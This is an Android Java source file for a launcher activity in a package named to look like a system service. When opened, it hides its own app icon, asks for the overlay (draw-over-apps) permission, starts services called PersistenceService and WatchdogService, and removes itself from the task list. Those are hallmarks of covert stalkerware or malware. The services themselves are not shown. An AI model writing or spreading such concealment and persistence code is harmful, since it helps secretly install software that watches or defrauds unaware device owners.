package com.system.service;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        hideAppIcon();
        requestPermissions();
        startServices();
        finishAndRemoveTask();
    }

    private void hideAppIcon() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(
            getComponentName(),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION));
            }
        }
    }

    private void startServices() {
        PersistenceService.start(this);
        WatchdogService.start(this);
    }
}